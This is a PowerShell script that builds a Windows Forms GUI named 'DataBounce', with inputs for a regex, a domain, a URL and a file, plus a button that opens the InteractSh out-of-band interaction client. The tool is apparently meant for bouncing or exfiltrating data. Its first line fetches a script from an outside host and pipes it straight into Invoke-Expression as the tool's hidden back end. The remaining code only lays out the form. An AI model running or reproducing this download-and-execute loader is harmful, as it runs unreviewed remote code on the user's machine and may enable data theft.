# Load in script for back end of Gui
irm https://unit259.fyi/db | iex

# Load the necessary assembly for creating forms
Add-Type -AssemblyName System.Windows.Forms

# Create the form
$form = New-Object System.Windows.Forms.Form
$form.Text = 'DataBounce'
$form.Size = New-Object System.Drawing.Size(300, 350)  # Increased the form height to accommodate the new button
$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedSingle
$form.MaximizeBox = $false
$form.BackColor = [System.Drawing.Color]::FromArgb(33, 33, 33)
$form.ForeColor = [System.Drawing.Color]::White

# Create 'regex' input field
$regexLabel = New-Object System.Windows.Forms.Label
$regexLabel.Text = 'Regex:'
$regexLabel.Location = New-Object System.Drawing.Point(10, 20)
$regexLabel.Size = New-Object System.Drawing.Size(280, 20)
$regexLabel.ForeColor = [System.Drawing.Color]::White

$regexInput = New-Object System.Windows.Forms.TextBox
$regexInput.Location = New-Object System.Drawing.Point(10, 40)
$regexInput.Size = New-Object System.Drawing.Size(260, 20)
$regexInput.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
$regexInput.ForeColor = [System.Drawing.Color]::White

# Create 'domain' input field
$domainLabel = New-Object System.Windows.Forms.Label
$domainLabel.Text = 'Domain:'
$domainLabel.Location = New-Object System.Drawing.Point(10, 70)
$domainLabel.Size = New-Object System.Drawing.Size(280, 20)
$domainLabel.ForeColor = [System.Drawing.Color]::White

$domainInput = New-Object System.Windows.Forms.TextBox
$domainInput.Location = New-Object System.Drawing.Point(10, 90)
$domainInput.Size = New-Object System.Drawing.Size(260, 20)
$domainInput.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
$domainInput.ForeColor = [System.Drawing.Color]::White

# Create 'url' input field
$urlLabel = New-Object System.Windows.Forms.Label
$urlLabel.Text = 'URL:'
$urlLabel.Location = New-Object System.Drawing.Point(10, 120)
$urlLabel.Size = New-Object System.Drawing.Size(280, 20)
$urlLabel.ForeColor = [System.Drawing.Color]::White

$urlInput = New-Object System.Windows.Forms.TextBox
$urlInput.Location = New-Object System.Drawing.Point(10, 140)
$urlInput.Size = New-Object System.Drawing.Size(260, 20)
$urlInput.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
$urlInput.ForeColor = [System.Drawing.Color]::White

# Create file upload button and file path input
$uploadButton = New-Object System.Windows.Forms.Button
$uploadButton.Text = 'Upload File'
$uploadButton.Location = New-Object System.Drawing.Point(10, 170)
$uploadButton.Size = New-Object System.Drawing.Size(100, 23)
$uploadButton.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
$uploadButton.ForeColor = [System.Drawing.Color]::White

$filePathInput = New-Object System.Windows.Forms.TextBox
$filePathInput.Location = New-Object System.Drawing.Point(120, 170)
$filePathInput.Size = New-Object System.Drawing.Size(150, 20)
$filePathInput.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
$filePathInput.ForeColor = [System.Drawing.Color]::White

$uploadButton.Add_Click({
    $openFileDialog = New-Object System.Windows.Forms.OpenFileDialog
    $openFileDialog.Filter = "All files (*.*)|*.*"
    $result = $openFileDialog.ShowDialog()
    if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
        $filePathInput.Text = $openFileDialog.FileName
    }
})

# Create 'execute' button
$executeButton = New-Object System.Windows.Forms.Button
$executeButton.Text = 'Execute'
$executeButton.Location = New-Object System.Drawing.Point(10, 200)
$executeButton.Size = New-Object System.Drawing.Size(260, 23)
$executeButton.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
$executeButton.ForeColor = [System.Drawing.Color]::White

$executeButton.Add_Click({
    # Place the code to execute here
    $regex = $regexInput.Text
    $domain = $domainInput.Text
    $url = $urlInput.Text
    $filePath = $filePathInput.Text

    # Example: Output the values
    [System.Windows.Forms.MessageBox]::Show("Regex: $regex`nDomain: $domain`nURL: $url`nFile Path: $filePath")
})

# Create 'InteractSh Web Client' button
$interactShButton = New-Object System.Windows.Forms.Button
$interactShButton.Text = 'InteractSh Web Client'
$interactShButton.Location = New-Object System.Drawing.Point(10, 230)  # Adjust the Y position as needed
$interactShButton.Size = New-Object System.Drawing.Size(260, 23)
$interactShButton.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
$interactShButton.ForeColor = [System.Drawing.Color]::White

$interactShButton.Add_Click({
    Start-Process "https://app.interactsh.com/#/"
})

# Add controls to the form
$form.Controls.Add($regexLabel)
$form.Controls.Add($regexInput)
$form.Controls.Add($domainLabel)
$form.Controls.Add($domainInput)
$form.Controls.Add($urlLabel)
$form.Controls.Add($urlInput)
$form.Controls.Add($uploadButton)
$form.Controls.Add($filePathInput)
$form.Controls.Add($executeButton)
$form.Controls.Add($interactShButton)  # Add the 'InteractSh Web Client' button

# Show the form
$form.ShowDialog()
